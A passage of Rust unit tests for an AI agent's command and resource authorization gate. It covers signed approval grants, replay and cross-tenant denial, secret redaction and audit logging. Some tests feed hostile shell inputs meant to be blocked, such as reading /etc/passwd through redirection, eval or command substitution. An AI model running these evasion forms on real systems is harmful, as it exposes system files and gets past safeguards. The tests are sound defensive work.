        // in the returned Err (propagated via `?` to stderr). Redact the secrets.
        // Phase 1: the per-command allowlist is gone, so to exercise the
        // "not allowed by security policy" deny path we use read-only mode, which
        // rejects every command outright.
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::ReadOnly,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&p);
        let err = gate
            .authorize_command_execution("shell", "deploy --token=supersecret", None)
            .unwrap_err();
        assert!(err.contains("not allowed by security policy"));
        assert!(
            !err.contains("supersecret"),
            "secret must be redacted in policy error: {err}"
        );
        assert!(err.contains("[REDACTED]"));
    }

    #[test]
    fn authorize_resource_operation_redacts_secrets_in_approval_error() {
        // BUG-D1-02: the approval-required deny reason embeds operation_name; it
        // can carry credentials, so the returned Err must be redacted.
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&p);
        let err = gate
            .authorize_resource_operation(
                "subagents",
                "subagents:spawn token=leakedvalue",
                ResourceRiskLevel::Medium,
                None,
            )
            .unwrap_err();
        assert!(err.contains("runtime approval grant"));
        assert!(
            !err.contains("leakedvalue"),
            "secret must be redacted in policy error: {err}"
        );
        assert!(err.contains("[REDACTED]"));
    }

    #[test]
    fn enforce_tool_operation_act_uses_rate_budget() {
        let p = SecurityPolicy {
            max_actions_per_hour: 0,
            ..default_policy()
        };
        let err = p
            .enforce_tool_operation(ToolOperation::Act, "memory_store")
            .unwrap_err();
        assert!(err.contains("Rate limit exceeded"));
    }

    #[test]
    fn side_effect_gate_requires_matching_approval_grant_for_medium_risk_command() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&p);

        let denied = gate.authorize_command_execution("shell", "touch file.txt", None);
        assert!(denied.unwrap_err().contains("runtime approval grant"));

        let wrong_tool = ApprovalGrant::for_tool("cron", "test", None);
        let denied = gate.authorize_command_execution("shell", "touch file.txt", Some(&wrong_tool));
        assert!(denied.unwrap_err().contains("runtime approval grant"));

        let broad_tool_grant = ApprovalGrant::for_tool("shell", "test", None);
        let denied = gate.authorize_command_execution("shell", "touch file.txt", Some(&broad_tool_grant));
        assert!(denied.unwrap_err().contains("runtime approval grant"));

        let grant = ApprovalGrant::for_command("shell", "touch file.txt", "test", None);
        assert_eq!(
            gate.authorize_command_execution("shell", "touch file.txt", Some(&grant))
                .unwrap(),
            CommandRiskLevel::Medium
        );
    }

    #[test]
    fn approval_grant_command_hash_binds_to_command_content() {
        let p = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&p);
        let grant = ApprovalGrant::for_command("shell", "touch approved.txt", "test", None);

        assert!(
            gate.authorize_command_execution("shell", "touch other.txt", Some(&grant))
                .unwrap_err()
                .contains("runtime approval grant")
        );
        assert_eq!(
            gate.authorize_command_execution("shell", "touch approved.txt", Some(&grant))
                .unwrap(),
            CommandRiskLevel::Medium
        );
    }

    #[test]
    fn side_effect_gate_resource_operation_obeys_readonly_and_medium_grants() {
        let readonly = readonly_policy();
        let readonly_gate = SideEffectGate::new(&readonly);
        let denied = readonly_gate
            .authorize_resource_operation(
                "sessions_send",
                "sessions_send:steer:run-1",
                ResourceRiskLevel::Low,
                None,
            )
            .unwrap_err();
        assert!(denied.contains("read-only mode"));

        let supervised = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let supervised_gate = SideEffectGate::new(&supervised);
        let denied = supervised_gate
            .authorize_resource_operation("subagents", "subagents:kill:run-1", ResourceRiskLevel::Medium, None)
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));

        let wrong_operation = ApprovalGrant::for_resource_operation("subagents", "subagents:kill:run-2", "test", None);
        let denied = supervised_gate
            .authorize_resource_operation(
                "subagents",
                "subagents:kill:run-1",
                ResourceRiskLevel::Medium,
                Some(&wrong_operation),
            )
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));

        let broad_tool_grant = ApprovalGrant::for_tool("subagents", "test", None);
        let denied = supervised_gate
            .authorize_resource_operation(
                "subagents",
                "subagents:kill:run-1",
                ResourceRiskLevel::Medium,
                Some(&broad_tool_grant),
            )
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));

        let grant = ApprovalGrant::for_resource_operation("subagents", "subagents:kill:run-1", "test", None);
        assert_eq!(
            supervised_gate
                .authorize_resource_operation(
                    "subagents",
                    "subagents:kill:run-1",
                    ResourceRiskLevel::Medium,
                    Some(&grant),
                )
                .unwrap(),
            ResourceRiskLevel::Medium
        );
    }

    // Phase 1: `block_high_risk_commands` was removed; `full` now authorizes every
    // resource operation (including high-risk) unconditionally, so the former
    // `side_effect_gate_blocks_high_risk_resource_when_policy_blocks_high` test no
    // longer has a behavior to assert and was deleted.

    #[test]
    fn side_effect_gate_accepts_verified_v2_resource_grant_only() {
        use crate::acl::approval_grant::{ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring};

        // The gate re-verifies against the process-global keyring, so the grant
        // must be signed by that same key. Pin it to a temp file.
        let _guard = global_keyring_guard();
        let keyring = WitnessKeyring::global().unwrap();
        let grant = ApprovalGrantV2::issue_one_shot(
            keyring,
            Subject {
                agent_id: "prx:test:agent".to_string(),
                principal_id: "telegram:alice".to_string(),
                owner_id: "owner:alice".to_string(),
                workspace_id: "workspace".to_string(),
                session_key: Some("session-a".to_string()),
            },
            IssuerAuthority::HumanReview,
            "nodes:exec:n1",
            RiskLevel::High,
        )
        .unwrap();
        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&policy);

        // A tampered grant (signature won't verify against the keyring) is
        // rejected regardless of any wire flag.
        let mut tampered_inner = grant.clone();
        tampered_inner.capability.op_id = "nodes:exec:n2".to_string();
        let tampered = ApprovalGrant {
            tool: "nodes".to_string(),
            operation_hash: None,
            operation_hash_v2: None,
            actor: "test".to_string(),
            scope: Some(grant.grant_id.clone()),
            expires_at_epoch_secs: Some(grant.expires_at.timestamp()),
            v2: Some(tampered_inner),
            v2_verified: true, // even an attacker-set "verified" flag must not help
            caller_principal_id: Some("telegram:alice".to_string()),
        };
        let denied = gate
            .authorize_resource_operation("nodes", "nodes:exec:n1", ResourceRiskLevel::High, Some(&tampered))
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));

        // A properly signed grant, bound to the matching caller principal, is
        // honoured through the real gate verification path (calls
        // `verify_for_operation_bound` against the global keyring).
        let verified = ApprovalGrant::from_verified_v2("nodes", "test", grant)
            .with_caller_principal_id(Some("telegram:alice".to_string()));
        assert_eq!(
            gate.authorize_resource_operation("nodes", "nodes:exec:n1", ResourceRiskLevel::High, Some(&verified))
                .unwrap(),
            ResourceRiskLevel::High
        );
    }

    /// Issue a signed v2 grant exactly as the agent loop does, serialize it into
    /// a tool-call args object (the trust boundary), then re-read it through
    /// `from_runtime_args` and feed it to the gate — i.e. the full production
    /// chain: loop-sign → JSON → tool deserialize → gate verify.
    fn issue_v2_into_args(
        op_id: &str,
        risk: crate::acl::approval_grant::RiskLevel,
        scope_principal: &str,
    ) -> serde_json::Value {
        use crate::acl::approval_grant::{ApprovalGrantV2, IssuerAuthority, Subject, WitnessKeyring};

        let _guard = global_keyring_guard();
        let keyring = WitnessKeyring::global().unwrap();
        let grant = ApprovalGrantV2::issue_one_shot(
            keyring,
            Subject {
                agent_id: "prx:agent:telegram".to_string(),
                principal_id: "telegram:alice".to_string(),
                owner_id: "owner:ws:telegram:alice".to_string(),
                workspace_id: "ws".to_string(),
                session_key: Some("chat-1".to_string()),
            },
            IssuerAuthority::HumanReview,
            op_id,
            risk,
        )
        .unwrap();
        // The loop wraps with from_verified_v2 then serializes; `v2_verified` is
        // `#[serde(skip)]` so it never reaches the wire.
        let wrapped = ApprovalGrant::from_verified_v2("file_write", "approval_manager", grant);
        let grant_json = serde_json::to_value(&wrapped).unwrap();
        json!({
            RUNTIME_APPROVAL_GRANT_ARG: grant_json,
            "_zc_scope_trusted": true,
            "_zc_scope": { "principal_id": scope_principal },
        })
    }

    #[test]
    fn v2_grant_end_to_end_through_runtime_args_reaches_gate() {
        let op = "file_write:write:abcd";
        let args = issue_v2_into_args(op, crate::acl::approval_grant::RiskLevel::Medium, "telegram:alice");

        // The deserialized grant must NOT carry a trusted `v2_verified` flag.
        let grant = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");
        assert!(!grant.v2_verified, "v2_verified must never survive deserialization");
        assert_eq!(grant.caller_principal_id.as_deref(), Some("telegram:alice"));
        assert!(grant.v2.is_some());

        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&policy);
        // Full chain authorizes: gate re-verifies signature + principal binding.
        assert_eq!(
            gate.authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
                .unwrap(),
            ResourceRiskLevel::Medium
        );
    }

    #[test]
    fn try_consume_v2_grant_enforces_max_uses() {
        // Direct ledger test (no keyring/env needed): a unique grant_id with
        // max_uses=2 is consumable exactly twice, then denied (M5). max_uses=0 is
        // never consumable.
        let gid = format!("grant-test-{}", uuid::Uuid::now_v7());
        assert!(try_consume_v2_grant(&gid, 2), "1st consume must succeed");
        assert!(try_consume_v2_grant(&gid, 2), "2nd consume must succeed");
        assert!(!try_consume_v2_grant(&gid, 2), "3rd consume must be denied (exhausted)");

        let zero = format!("grant-test-zero-{}", uuid::Uuid::now_v7());
        assert!(!try_consume_v2_grant(&zero, 0), "max_uses=0 must never consume");
    }

    #[test]
    fn gate_denies_single_use_v2_grant_on_replay() {
        // M5 replay defense end-to-end: a single-use (max_uses=1) v2 grant is
        // allowed exactly once through the gate; a second authorization of the
        // SAME grant within the validity window is denied (uses exhausted).
        let op = "file_write:write:single-use-replay";
        let args = issue_v2_into_args(op, crate::acl::approval_grant::RiskLevel::Medium, "telegram:alice");
        let grant = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");
        assert_eq!(
            grant.v2.as_ref().map(|g| g.max_uses),
            Some(1),
            "runtime grants are single-use by default"
        );

        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };

        let first = SideEffectGate::new(&policy).authorize_resource_operation(
            "file_write",
            op,
            ResourceRiskLevel::Medium,
            Some(&grant),
        );
        assert!(first.is_ok(), "first use of a single-use grant must be allowed");

        let second = SideEffectGate::new(&policy).authorize_resource_operation(
            "file_write",
            op,
            ResourceRiskLevel::Medium,
            Some(&grant),
        );
        assert!(
            second.is_err(),
            "second use of a single-use grant must be denied (replay)"
        );
    }

    #[test]
    fn v2_glob_grant_matches_resolved_op_through_gate() {
        use crate::acl::approval_grant::{
            ApprovalGrantV2, IssuerAuthority, OpIdMatch, RiskLevel, Subject, WitnessKeyring,
        };

        let _guard = global_keyring_guard();
        let keyring = WitnessKeyring::global().unwrap();
        // Loop issues a tool+verb glob (file_write derives its real op-id from
        // the canonicalized resolved path, which the loop cannot reproduce).
        let grant = ApprovalGrantV2::issue_one_shot_match(
            keyring,
            Subject {
                agent_id: "prx:agent:telegram".to_string(),
                principal_id: "telegram:alice".to_string(),
                owner_id: "owner:ws:telegram:alice".to_string(),
                workspace_id: "ws".to_string(),
                session_key: Some("chat-1".to_string()),
            },
            IssuerAuthority::HumanReview,
            "file_write:write:*",
            OpIdMatch::GlobPattern("file_write:write:*".to_string()),
            RiskLevel::Medium,
        )
        .unwrap();
        let wrapped = ApprovalGrant::from_verified_v2("file_write", "approval_manager", grant);
        let args = json!({
            RUNTIME_APPROVAL_GRANT_ARG: serde_json::to_value(&wrapped).unwrap(),
            "_zc_scope_trusted": true,
            "_zc_scope": { "principal_id": "telegram:alice" },
        });
        let read = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");

        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&policy);
        // The tool's resolved op-id (e.g. file_write:write:<sha16>) must be
        // authorized by the glob.
        let resolved_op = "file_write:write:0123456789abcdef";
        assert_eq!(
            gate.authorize_resource_operation("file_write", resolved_op, ResourceRiskLevel::Medium, Some(&read))
                .unwrap(),
            ResourceRiskLevel::Medium
        );
        // But a different tool/verb op is NOT covered by the glob.
        let other = gate
            .authorize_resource_operation(
                "file_write",
                "file_write:delete:0123",
                ResourceRiskLevel::Medium,
                Some(&read),
            )
            .unwrap_err();
        assert!(other.contains("runtime approval grant"));
    }

    #[test]
    fn v2_grant_cross_tenant_rejected_through_runtime_args() {
        let op = "file_write:write:abcd";
        // Grant subject is telegram:alice, but the trusted scope says the caller
        // is telegram:mallory — M4 cross-tenant reuse must be denied.
        let args = issue_v2_into_args(op, crate::acl::approval_grant::RiskLevel::Medium, "telegram:mallory");
        let grant = ApprovalGrant::from_runtime_args("file_write", &args).expect("grant present");
        assert_eq!(grant.caller_principal_id.as_deref(), Some("telegram:mallory"));

        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&policy);
        let denied = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));
    }

    #[test]
    fn p3_07_for_command_binds_256bit_v2_digest() {
        // for_command now mints a 256-bit (SHA-256) v2 digest as well as the
        // legacy 64-bit one.
        let grant = ApprovalGrant::for_command("shell", "rm -rf /tmp/x", "policy", None);
        let v2 = grant.operation_hash_v2.as_deref().expect("v2 digest must be present");
        // SHA-256 hex is exactly 64 hex chars (256 bits).
        assert_eq!(v2.len(), 64, "expected 256-bit hex digest, got {v2}");
        assert!(v2.chars().all(|c| c.is_ascii_hexdigit()));
        // v2 digest equals the standalone helper for the same input...
        assert_eq!(v2, command_operation_hash_v2("shell", "rm -rf /tmp/x"));
        // ...and differs for a different command (second-preimage binding).
        assert_ne!(v2, command_operation_hash_v2("shell", "rm -rf /tmp/y"));
    }

    #[test]
    fn p3_07_v2_digest_binds_command_and_rejects_mismatch() {
        let now = Utc::now().timestamp();
        let grant = ApprovalGrant::for_command("shell", "echo hi", "policy", None);
        // The v2-bound grant authorizes the exact command it was minted for.
        assert!(grant.permits_command("shell", "echo hi", CommandRiskLevel::Low, now));
        // A different command (which would collide only on a 64-bit truncation
        // attack) is rejected by the 256-bit binding.
        assert!(!grant.permits_command("shell", "echo bye", CommandRiskLevel::Low, now));
        // Wrong tool is rejected too.
        assert!(!grant.permits_command("other", "echo hi", CommandRiskLevel::Low, now));
    }

    #[test]
    fn p3_07_v1_only_grant_still_verifies_via_fallback() {
        // Simulate a legacy grant persisted before v2 existed: it carries only
        // the 64-bit digest. Verification must fall back to v1 and still bind.
        let now = Utc::now().timestamp();
        let mut legacy = ApprovalGrant::for_command("shell", "ls -la", "policy", None);
        legacy.operation_hash_v2 = None; // pre-v2 on-disk shape
        assert!(legacy.operation_hash.is_some(), "v1 digest preserved");
        assert!(legacy.permits_command("shell", "ls -la", CommandRiskLevel::Low, now));
        assert!(!legacy.permits_command("shell", "ls -l", CommandRiskLevel::Low, now));
    }

    #[test]
    fn p3_07_v1_grant_json_without_v2_field_deserializes() {
        // d08 backward compatibility: a serialized v1 grant that predates the
        // operation_hash_v2 field must still deserialize (serde default = None).
        let json = r#"{
            "tool": "shell",
            "operation_hash": 305419896,
            "actor": "policy",
            "scope": null,
            "expires_at_epoch_secs": null
        }"#;
        let grant: ApprovalGrant = serde_json::from_str(json).expect("v1 grant deserializes");
        assert_eq!(grant.operation_hash, Some(305_419_896));
        assert_eq!(grant.operation_hash_v2, None);
        // A v1-only grant also serializes without emitting the v2 field.
        let out = serde_json::to_string(&grant).expect("serialize");
        assert!(
            !out.contains("operation_hash_v2"),
            "v1 grant must not emit v2 field: {out}"
        );
    }

    #[test]
    fn p3_10_gate_denies_when_reentrancy_depth_exceeded() {
        // Full autonomy so a benign command is otherwise authorized; the only
        // reason to deny here must be the re-entrancy depth bound.
        let mut autonomy = crate::config::AutonomyConfig::default();
        autonomy.level = AutonomyLevel::Full;
        let policy = SecurityPolicy::from_config(&autonomy, std::path::Path::new("/tmp"));

        // `cargo test` reuses worker threads, and GATE_DEPTH is thread-local, so
        // a previously-aborted test could have left a non-zero residual depth on
        // this thread. Snapshot it and restore deterministically at the end so
        // this test neither sees stale state nor leaks state into sibling tests.
        let baseline = GateDepthGuard::current_depth();

        // Hold MAX_GATE_DEPTH active depth guards on top of the baseline; the
        // next gate call enters one level deeper and must be denied. The guards
        // are dropped explicitly below (and on panic via RAII) so depth returns
        // to `baseline`.
        let mut guards = Vec::new();
        for _ in 0..=(MAX_GATE_DEPTH - baseline.min(MAX_GATE_DEPTH)) {
            guards.push(GateDepthGuard::enter());
        }
        let denied = SideEffectGate::new(&policy)
            .authorize_command_execution("shell", "ls", None)
            .unwrap_err();
        assert!(denied.contains("re-entrancy depth"), "{denied}");
        drop(guards);

        // Back at `baseline` depth: a fresh authorization is accepted again,
        // proving the guard restores state (the gate enters exactly one level).
        assert_eq!(GateDepthGuard::current_depth(), baseline);
        assert!(
            SideEffectGate::new(&policy)
                .authorize_command_execution("shell", "ls", None)
                .is_ok()
        );
        assert_eq!(
            GateDepthGuard::current_depth(),
            baseline,
            "gate authorization must not leak depth"
        );
    }

    #[test]
    fn gate_denies_op_with_no_precise_binding() {
        // operation_hash = None AND v2 = None => deny (d08 tightened default).
        let wildcard = ApprovalGrant::for_tool("file_write", "approval_manager", None);
        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&policy);
        let denied = gate
            .authorize_resource_operation(
                "file_write",
                "file_write:write:abcd",
                ResourceRiskLevel::Medium,
                Some(&wildcard),
            )
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));
    }

    #[test]
    fn v2_grant_expired_and_revoked_rejected_through_gate() {
        use crate::acl::approval_grant::{
            ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring, sign_grant,
        };

        let _guard = global_keyring_guard();
        let keyring = WitnessKeyring::global().unwrap();
        let subject = Subject {
            agent_id: "prx:agent:telegram".to_string(),
            principal_id: "telegram:alice".to_string(),
            owner_id: "owner:ws:telegram:alice".to_string(),
            workspace_id: "ws".to_string(),
            session_key: Some("chat-1".to_string()),
        };
        let op = "file_write:write:expired";

        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            ..SecurityPolicy::default()
        };
        let gate = SideEffectGate::new(&policy);

        // Expired: backdate the window and re-sign so the signature is valid but
        // the temporal check fails.
        let mut expired = ApprovalGrantV2::issue_one_shot(
            keyring,
            subject.clone(),
            IssuerAuthority::HumanReview,
            op,
            RiskLevel::Medium,
        )
        .unwrap();
        expired.not_before = Utc::now() - chrono::Duration::seconds(120);
        expired.expires_at = Utc::now() - chrono::Duration::seconds(60);
        sign_grant(keyring, &mut expired).unwrap();
        let expired_grant = ApprovalGrant::from_verified_v2("file_write", "test", expired)
            .with_caller_principal_id(Some("telegram:alice".to_string()));
        let denied = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&expired_grant))
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));

        // Revoked: valid window and signature, but revoked_at is set.
        let mut revoked =
            ApprovalGrantV2::issue_one_shot(keyring, subject, IssuerAuthority::HumanReview, op, RiskLevel::Medium)
                .unwrap();
        revoked.revoke("operator", Utc::now());
        sign_grant(keyring, &mut revoked).unwrap();
        let revoked_grant = ApprovalGrant::from_verified_v2("file_write", "test", revoked)
            .with_caller_principal_id(Some("telegram:alice".to_string()));
        let denied = gate
            .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&revoked_grant))
            .unwrap_err();
        assert!(denied.contains("runtime approval grant"));
    }

    // ── Audit compliance (EU AI Act Art.12) ──────────────────

    /// Supervised policy rooted at a real temp workspace so the best-effort
    /// audit hook actually writes `audit.log` (it skips `.`/empty workspaces).
    fn audited_policy() -> (tempfile::TempDir, SecurityPolicy) {
        let tmp = tempfile::TempDir::new().expect("test: temp workspace");
        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            workspace_dir: tmp.path().to_path_buf(),
            ..SecurityPolicy::default()
        };
        (tmp, policy)
    }

    fn read_audit_events(workspace: &std::path::Path) -> Vec<crate::security::audit::AuditEvent> {
        let raw = std::fs::read_to_string(workspace.join("audit.log")).expect("test: read audit.log");
        raw.lines()
            .filter(|l| !l.trim().is_empty())
            .map(|l| serde_json::from_str(l).expect("test: parse audit event"))
            .collect()
    }

    fn last_deny_reason(workspace: &std::path::Path) -> String {
        read_audit_events(workspace)
            .last()
            .and_then(|e| e.result.as_ref())
            .and_then(|r| r.error.clone())
            .expect("test: deny reason recorded")
    }

    #[test]
    fn gate_with_audit_disabled_writes_no_audit_log() {
        // FIX-P1-31: a policy carrying `security.audit.enabled=false` must skip the
        // gate audit write (and its synchronous fsync) entirely.
        let tmp = tempfile::TempDir::new().expect("test: temp workspace");
        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            workspace_dir: tmp.path().to_path_buf(),
            ..SecurityPolicy::default()
        }
        .with_audit_config(crate::config::AuditConfig {
            enabled: false,
            ..crate::config::AuditConfig::default()
        });

        // Deny path (no grant for medium risk under supervised) — would normally
        // write a tool_gate audit event; with audit disabled it must not.
        let gate = SideEffectGate::new(&policy);
        let _ = gate.authorize_resource_operation("file_write", "file_write:write:x", ResourceRiskLevel::Medium, None);

        assert!(
            !tmp.path().join("audit.log").exists(),
            "audit.log must not be created when security.audit.enabled=false"
        );
    }

    #[test]
    fn gate_with_audit_enabled_writes_audit_log() {
        // Sanity counterpart: explicit enabled=true config still writes.
        let tmp = tempfile::TempDir::new().expect("test: temp workspace");
        let policy = SecurityPolicy {
            autonomy: AutonomyLevel::Supervised,
            workspace_dir: tmp.path().to_path_buf(),
            ..SecurityPolicy::default()
        }
        .with_audit_config(crate::config::AuditConfig {
            enabled: true,
            ..crate::config::AuditConfig::default()
        });

        let gate = SideEffectGate::new(&policy);
        let _ = gate.authorize_resource_operation("file_write", "file_write:write:x", ResourceRiskLevel::Medium, None);

        assert!(
            tmp.path().join("audit.log").exists(),
            "audit.log must be created when security.audit.enabled=true"
        );
    }

    #[test]
    fn forbidden_redirection_gate_records_one_deny_for_each_shell_entry_name_and_bypass() {
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            for command in ["cat </etc/passwd", "cat</etc/passwd"] {
                let reason = gate
                    .authorize_command_execution(tool_name, command, None)
                    .expect_err("forbidden redirection path should be denied");
                assert_eq!(reason, "forbidden path argument: /etc/passwd");
            }
        }

        let events = read_audit_events(tmp.path());
        assert_eq!(events.len(), 6, "each gate call must emit exactly one audit event");
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            let prefix = format!("{tool_name}:");
            let matching = events
                .iter()
                .filter(|event| {
                    event
                        .action
                        .as_ref()
                        .and_then(|action| action.command.as_deref())
                        .is_some_and(|command| command.starts_with(&prefix))
                })
                .count();
            assert_eq!(matching, 2, "expected one audit decision per bypass for {tool_name}");
        }
    }

    #[test]
    fn dynamic_path_gate_records_one_deny_for_each_shell_entry_name() {
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            let reason = gate
                .authorize_command_execution(tool_name, "FILE=/etc/passwd; eval 'cat $FILE'", None)
                .expect_err("wrapper-hidden dynamic shell path should fail closed");
            assert_eq!(reason, "forbidden dynamic path argument: $FILE");
        }

        let events = read_audit_events(tmp.path());
        assert_eq!(events.len(), 3, "each gate call must emit exactly one audit event");
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            let prefix = format!("{tool_name}:");
            let matching = events
                .iter()
                .filter(|event| {
                    event
                        .action
                        .as_ref()
                        .and_then(|action| action.command.as_deref())
                        .is_some_and(|command| command.starts_with(&prefix))
                })
                .count();
            assert_eq!(matching, 1, "expected one dynamic-path audit decision for {tool_name}");
        }
    }

    #[test]
    fn active_substitution_gate_records_one_deny_per_tool_and_form() {
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let commands = [
            r#"cat `printf '\057etc\057passwd'`"#,
            r#"echo "$(cat /etc/passwd)""#,
            "cat <(printf secret)",
        ];
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            for command in commands {
                let reason = gate
                    .authorize_command_execution(tool_name, command, None)
                    .expect_err("active substitution must fail closed");
                assert_eq!(reason, "forbidden active shell substitution");
            }
        }

        let events = read_audit_events(tmp.path());
        assert_eq!(events.len(), 9, "each gate call must emit exactly one audit event");
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            let prefix = format!("{tool_name}:");
            let matching = events
                .iter()
                .filter(|event| {
                    event
                        .action
                        .as_ref()
                        .and_then(|action| action.command.as_deref())
                        .is_some_and(|command| command.starts_with(&prefix))
                })
                .count();
            assert_eq!(matching, 3, "expected one audit decision per substitution form");
        }
    }

    #[test]
    fn line_continuation_substitution_gate_records_original_command_once_per_tool_and_form() {
        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        let commands = [
            "echo $\\\n(printf secret)",
            "cat <\\\n(printf secret)",
            "echo $\\\r\n(printf secret)",
            "cat <\\\r\n(printf secret)",
        ];
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            for command in commands {
                let reason = gate
                    .authorize_command_execution(tool_name, command, None)
                    .expect_err("line continuation must not split an active substitution operator");
                assert_eq!(reason, "forbidden active shell substitution");
            }
        }

        let events = read_audit_events(tmp.path());
        assert_eq!(events.len(), 12, "each gate call must emit exactly one audit event");
        for tool_name in ["shell", "cron_scheduler", "xin_runner"] {
            for command in commands {
                let expected = format!("{tool_name}:{command}");
                let matching = events
                    .iter()
                    .filter(|event| {
                        event.action.as_ref().and_then(|action| action.command.as_deref()) == Some(expected.as_str())
                    })
                    .count();
                assert_eq!(matching, 1, "audit must retain the original physical command exactly");
            }
        }
    }

    #[test]
    fn gate_allow_writes_audit_event_with_compliance_fields() {
        use crate::acl::approval_grant::{ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring};
        let _guard = global_keyring_guard();
        let keyring = WitnessKeyring::global().expect("test: keyring");
        let op = "file_write:write:allowme";
        let grant_v2 = ApprovalGrantV2::issue_one_shot(
            keyring,
            Subject {
                agent_id: "prx:agent".to_string(),
                principal_id: "telegram:alice".to_string(),
                owner_id: "owner:alice".to_string(),
                workspace_id: "ws".to_string(),
                session_key: Some("s1".to_string()),
            },
            IssuerAuthority::HumanReview,
            op,
            RiskLevel::Medium,
        )
        .expect("test: issue grant");
        let grant_id = grant_v2.grant_id.clone();
        let grant = ApprovalGrant::from_verified_v2("file_write", "test", grant_v2)
            .with_caller_principal_id(Some("telegram:alice".to_string()));

        let (tmp, policy) = audited_policy();
        let gate = SideEffectGate::new(&policy);
        assert_eq!(
            gate.authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
                .expect("test: allow"),
            ResourceRiskLevel::Medium
        );

        let events = read_audit_events(tmp.path());
        let event = events.last().expect("an audit event was written");
        let actor = event.actor.as_ref().expect("actor present");
        assert_eq!(
            actor.user_id.as_deref(),
            Some("telegram:alice"),
            "subject principal recorded"
        );
        let action = event.action.as_ref().expect("action present");
        assert!(action.allowed, "decision is allow");
        let command = action.command.as_deref().expect("op recorded");
        assert!(command.contains(op), "op_id recorded");
        assert!(command.contains(&format!("grant_id={grant_id}")), "grant_id recorded");
        assert!(event.timestamp <= Utc::now(), "timestamp stamped");
    }

    #[test]
    fn gate_deny_writes_audit_event_with_precise_reason() {
        use crate::acl::approval_grant::{
            ApprovalGrantV2, IssuerAuthority, RiskLevel, Subject, WitnessKeyring, sign_grant,
        };
        let _guard = global_keyring_guard();
        let keyring = WitnessKeyring::global().expect("test: keyring");
        let op = "file_write:write:denyme";
        let subject = Subject {
            agent_id: "prx:agent".to_string(),
            principal_id: "telegram:alice".to_string(),
            owner_id: "owner:alice".to_string(),
            workspace_id: "ws".to_string(),
            session_key: Some("s1".to_string()),
        };

        // (2) operation_hash=None (no precise binding, v1 wildcard grant)
        {
            let (tmp, policy) = audited_policy();
            let gate = SideEffectGate::new(&policy);
            let wildcard = ApprovalGrant::for_tool("file_write", "test", None);
            let _ = gate
                .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&wildcard))
                .unwrap_err();
            assert!(last_deny_reason(tmp.path()).contains("operation_hash=None"));
        }
        // (3) cross-tenant principal mismatch
        {
            let g = ApprovalGrantV2::issue_one_shot(
                keyring,
                subject.clone(),
                IssuerAuthority::HumanReview,
                op,
                RiskLevel::Medium,
            )
            .expect("test: issue");
            let grant = ApprovalGrant::from_verified_v2("file_write", "test", g)
                .with_caller_principal_id(Some("telegram:mallory".to_string()));
            let (tmp, policy) = audited_policy();
            let gate = SideEffectGate::new(&policy);
            let _ = gate
                .authorize_resource_operation("file_write", op, ResourceRiskLevel::Medium, Some(&grant))
                .unwrap_err();
            assert!(last_deny_reason(tmp.path()).contains("principal mismatch"));
        }
        // (4) expired
        {
            let mut g = ApprovalGrantV2::issue_one_shot(
                keyring,
                subject.clone(),
                IssuerAuthority::HumanReview,
                op,
                RiskLevel::Medium,
            )
            .expect("test: issue");
            g.not_before = Utc::now() - chrono::Duration::seconds(120);
            g.expires_at = Utc::now() - chrono::Duration::seconds(60);
